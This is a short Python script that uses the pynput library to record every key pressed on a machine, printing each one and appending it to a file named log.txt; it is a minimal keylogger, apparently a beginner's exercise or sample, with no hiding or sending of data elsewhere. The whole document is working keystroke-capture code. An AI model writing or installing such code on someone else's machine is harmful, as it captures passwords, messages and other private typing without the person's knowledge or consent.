#!/usr/bin/env python3

import pynput.keyboard

def process_keys(key):
    print(key)
    with open("log.txt", "a") as fin:
        fin.write(str(key))

keyboard_listener = pynput.keyboard.Listener(on_press = process_keys)

with keyboard_listener:
    keyboard_listener.join()